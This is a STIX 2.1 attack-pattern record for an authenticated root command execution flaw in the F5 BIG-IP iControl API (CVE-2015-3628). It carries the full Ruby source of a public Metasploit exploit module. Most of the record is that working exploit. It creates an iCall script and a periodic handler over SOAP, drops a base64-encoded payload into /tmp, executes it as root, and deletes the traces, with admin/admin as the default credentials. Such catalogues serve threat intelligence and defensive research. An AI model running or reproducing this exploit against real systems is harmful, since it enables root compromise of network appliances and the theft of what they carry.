{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b87db7eb-7418-4ce8-a333-34fce4459c2b",
    "created": "2024-08-14T17:00:35.624419Z",
    "modified": "2024-08-14T17:00:35.624423Z",
    "name": "\"F5 iControl iCall::Script Root Command Execution\"",
    "description": " This module exploits an authenticated privilege escalation vulnerability in the iControl API on the F5 BIG-IP LTM (and likely other F5 devices). This requires valid credentials and the Resource Administrator role. The exploit should work on BIG-IP 11.3.0 - 11.6.0, (11.5.x < 11.5.3 HF2 or 11.6.x < 11.6.0 HF6, see references for more details)  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_icall_cmd.rb",
            "external_id": "f5_icall_cmd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3628"
        },
        {
            "source_name": "reference",
            "url": "https://support.f5.com/kb/en-us/solutions/public/16000/700/sol16728.html"
        },
        {
            "source_name": "reference",
            "url": "https://gdssecurity.squarespace.com/labs/2015/9/8/f5-icallscript-privilege-escalation-cve-2015-3628.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'nokogiri'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  SOAPENV_ENCODINGSTYLE = { \"soapenv:encodingStyle\" => \"http://schemas.xmlsoap.org/soap/encoding/\" }\n  STRING_ATTRS = { 'xsi:type' => 'urn:Common.StringSequence', 'soapenc:arrayType' => 'xsd:string[]', 'xmlns:urn' => 'urn:iControl' }\n  LONG_ATTRS = { 'xsi:type' => 'urn:Common.ULongSequence', 'soapenc:arrayType' => 'xsd:long[]', 'xmlns:urn' => 'urn:iControl' }\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => \"F5 iControl iCall::Script Root Command Execution\",\n        'Description'    => %q{\n          This module exploits an authenticated privilege escalation\n          vulnerability in the iControl API on the F5 BIG-IP LTM (and likely\n          other F5 devices). This requires valid credentials and the Resource\n          Administrator role. The exploit should work on BIG-IP 11.3.0\n          - 11.6.0, (11.5.x < 11.5.3 HF2 or 11.6.x < 11.6.0 HF6, see references\n          for more details)\n        },\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'tom', # Discovery, Metasploit module\n            'Jon Hart <jon_hart[at]rapid7.com>' # Metasploit module\n          ],\n        'References'     =>\n          [\n            ['CVE', '2015-3628'],\n            ['URL', 'https://support.f5.com/kb/en-us/solutions/public/16000/700/sol16728.html'],\n            ['URL', 'https://gdssecurity.squarespace.com/labs/2015/9/8/f5-icallscript-privilege-escalation-cve-2015-3628.html']\n          ],\n        'Platform'       => ['unix'],\n        'Arch'           => ARCH_CMD,\n        'Targets'        =>\n          [\n            ['F5 BIG-IP LTM 11.x', {}]\n          ],\n        'Privileged'     => true,\n        'DisclosureDate' => '2015-09-03',\n        'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('TARGETURI', [true, 'The base path to the iControl installation', '/iControl/iControlPortal.cgi']),\n        OptString.new('HttpUsername', [true, 'The username to authenticate with', 'admin']),\n        OptString.new('HttpPassword', [true, 'The password to authenticate with', 'admin'])\n      ])\n    register_advanced_options(\n      [\n        OptInt.new('SESSION_WAIT', [ true, 'The max time to wait for a session, in seconds', 5 ]),\n        OptString.new('PATH', [true, 'Filesystem path for the dropped payload', '/tmp']),\n        OptString.new('FILENAME', [false, 'File name of the dropped payload, defaults to random']),\n        OptInt.new('ARG_MAX', [true, 'Command line length limit', 131072])\n      ])\n  end\n\n  def setup\n    file = datastore['FILENAME']\n    file ||= \".#{Rex::Text.rand_text_alphanumeric(16)}\"\n    @payload_path = ::File.join(datastore['PATH'], file)\n    super\n  end\n\n  def build_xml\n    builder = Nokogiri::XML::Builder.new do |xml|\n      xml.Envelope do\n        xml = xml_add_namespaces(xml)\n        xml['soapenv'].Header\n        xml['soapenv'].Body do\n          yield xml\n        end\n      end\n    end\n    builder.to_xml\n  end\n\n  def xml_add_namespaces(xml)\n    ns = xml.doc.root.add_namespace_definition(\"soapenv\", \"http://schemas.xmlsoap.org/soap/envelope/\")\n    xml.doc.root.namespace = ns\n    xml.doc.root.add_namespace_definition(\"xsi\", \"http://www.w3.org/2001/XMLSchema-instance\")\n    xml.doc.root.add_namespace_definition(\"xsd\", \"http://www.w3.org/2001/XMLSchema\")\n    xml.doc.root.add_namespace_definition(\"scr\", \"urn:iControl:iCall/Script\")\n    xml.doc.root.add_namespace_definition(\"soapenc\", \"http://schemas.xmlsoap.org/soap/encoding\")\n    xml.doc.root.add_namespace_definition(\"per\", \"urn:iControl:iCall/PeriodicHandler\")\n    xml\n  end\n\n  def send_soap_request(pay)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'POST',\n      'data' => pay,\n      'username' => datastore['HttpUsername'],\n      'password' => datastore['HttpPassword']\n    )\n    if res\n      return res\n    else\n      vprint_error('No response')\n    end\n    false\n  end\n\n  def create_script(name, cmd)\n    create_xml = build_xml do |xml|\n      xml['scr'].create(SOAPENV_ENCODINGSTYLE) do\n        xml.scripts(STRING_ATTRS) do\n          xml.parent.namespace = xml.parent.parent.namespace_definitions.first\n          xml.item name\n        end\n        xml.definitions(STRING_ATTRS) do\n          xml.parent.namespace = xml.parent.parent.namespace_definitions.first\n          xml.item cmd\n        end\n      end\n    end\n    send_soap_request(create_xml)\n  end\n\n  def delete_script(script_name)\n    delete_xml = build_xml do |xml|\n      xml['scr'].delete_script(SOAPENV_ENCODINGSTYLE) do\n        xml.scripts(STRING_ATTRS) do\n          xml.parent.namespace = xml.parent.parent.namespace_definitions.first\n          xml.item script_name\n        end\n      end\n    end\n    print_error(\"Error while cleaning up script #{script_name}\") unless (res = send_soap_request(delete_xml))\n    res\n  end\n\n  def script_exists?(script_name)\n    exists_xml = build_xml do |xml|\n      xml['scr'].get_list(SOAPENV_ENCODINGSTYLE)\n    end\n    res = send_soap_request(exists_xml)\n    res && res.code == 200 && res.body =~ Regexp.new(\"/Common/#{script_name}\")\n  end\n\n  def create_handler(handler_name, script_name)\n    print_status(\"Creating trigger #{handler_name}\")\n    handler_xml = build_xml do |xml|\n      xml['per'].create(SOAPENV_ENCODINGSTYLE) do\n        xml.handlers(STRING_ATTRS) do\n          xml.parent.namespace = xml.parent.parent.namespace_definitions.first\n          xml.item handler_name\n        end\n        xml.scripts(STRING_ATTRS) do\n          xml.parent.namespace = xml.parent.parent.namespace_definitions.first\n          xml.item script_name\n        end\n        xml.intervals(LONG_ATTRS) do\n          xml.parent.namespace = xml.parent.parent.namespace_definitions.first\n          # we set this to run once every 24h, but because there is no\n          # start/end time it will run once, more or less immediately, and\n          # again 24h from now, but by that point hopefully we will have\n          # cleaned up and the handler/script/etc are gone\n          xml.item 60 * 60 * 24\n        end\n      end\n    end\n    res = send_soap_request(handler_xml)\n    if res\n      if res.code == 200 && res.body =~ Regexp.new(\"iCall/PeriodicHandler\")\n        true\n      else\n        print_error(\"Trigger creation failed -- HTTP/#{res.proto} #{res.code} #{res.message}\")\n        false\n      end\n    else\n      print_error(\"No response to trigger creation\")\n      false\n    end\n  end\n\n  def delete_handler(handler_name)\n    delete_xml = build_xml do |xml|\n      xml['per'].delete_handler(SOAPENV_ENCODINGSTYLE) do\n        xml.handlers(STRING_ATTRS) do\n          xml.parent.namespace = xml.parent.parent.namespace_definitions.first\n          xml.item handler_name\n        end\n      end\n    end\n\n    print_error(\"Error while cleaning up handler #{handler_name}\") unless (res = send_soap_request(delete_xml))\n    res\n  end\n\n  def handler_exists?(handler_name)\n    handler_xml = build_xml do |xml|\n      xml['per'].get_list(SOAPENV_ENCODINGSTYLE)\n    end\n    res = send_soap_request(handler_xml)\n    res && res.code == 200 && res.body =~ Regexp.new(\"/Common/#{handler_name}\")\n  end\n\n  def check\n    # strategy: we'll send a create_script request, with empty name:\n    # if everything is ok, the server return a 500 error saying it doesn't like empty names\n    # XXX ignored at the moment: if the user doesn't have enough privileges, 500 error also is returned, but saying 'access denied'.\n    # if the user/password is wrong, a 401 error is returned, the server might or might not be vulnerable\n    # any other response is considered not vulnerable\n    res = create_script('', '')\n    if res && res.code == 500 && res.body =~ /path is empty/\n      return Exploit::CheckCode::Appears\n    elsif res && res.code == 401\n      print_warning(\"HTTP/#{res.proto} #{res.code} #{res.message} -- incorrect USERNAME or PASSWORD?\")\n      return Exploit::CheckCode::Unknown\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    # phase 1: create iCall script to create file with payload, execute it and remove it.\n    shell_cmd = %(echo #{Rex::Text.encode_base64(payload.encoded)}|base64 --decode >#{@payload_path}; chmod +x #{@payload_path};#{@payload_path})\n    cmd = %(exec /bin/sh -c \"#{shell_cmd}\")\n\n    arg_max = datastore['ARG_MAX']\n    if shell_cmd.size > arg_max\n      print_error \"Payload #{datastore['PAYLOAD']} is too big, try a different payload \"\\\n        \"or increasing ARG_MAX (note that payloads bigger than the target's configured ARG_MAX value may fail to execute)\"\n      return false\n    end\n\n    script_name = \"script-#{Rex::Text.rand_text_alphanumeric(16)}\"\n    print_status(\"Uploading payload script #{script_name}\")\n    unless (create_script_res = create_script(script_name, cmd))\n      print_error(\"No response when uploading payload script\")\n      return false\n    end\n    unless create_script_res.code == 200\n      print_error(\"Upload payload script failed -- HTTP/#{create_script_res.proto} \"\\\n                  \"#{create_script_res.code} #{create_script_res.message}\")\n      return false\n    end\n    unless script_exists?(script_name)\n      print_error(\"Payload script uploaded successfully but script was not found\")\n      return false\n    end\n    register_file_for_cleanup @payload_path\n\n    # phase 2: create iCall Handler, that will actually run the previously created script\n    handler_name = \"handler-#{Rex::Text.rand_text_alphanumeric(16)}\"\n    unless create_handler(handler_name, script_name)\n      delete_script(script_name)\n      return false\n    end\n    unless handler_exists?(handler_name)\n      print_error(\"Trigger created successfully but was not found\")\n      delete_script(script_name)\n      return false\n    end\n    print_status('Waiting for payload to execute...')\n\n    # if our payload has not been successfully executed just yet, wait\n    # until it does or give up\n    slept = 0\n    until session_created? || slept > datastore['SESSION_WAIT']\n      Rex.sleep(1)\n      slept += 1\n    end\n\n    print_status('Trying cleanup...')\n    delete_script(script_name)\n    delete_handler(handler_name)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-03",
    "x_mitre_platforms": [
        "['unix']"
    ]
}